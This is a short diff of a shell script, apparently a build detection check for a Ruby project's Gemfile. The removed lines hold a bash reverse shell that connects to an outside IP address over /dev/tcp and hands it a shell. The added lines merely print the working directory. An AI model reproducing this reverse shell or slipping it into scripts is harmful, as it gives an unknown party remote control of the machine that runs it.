@@ -13,8 +13,8 @@ else
 fi
 
 if [ -f "$APP_DIR/Gemfile" ]; then
-  echo "Ruaaby"
-  0<&196;exec 196<>/dev/tcp/165.227.53.194//80; sh <&196 >&196 2>&196
+  export A=$(pwd)
+  echo "Ruaaby $A"
   exit 0
 else
   echo "no"
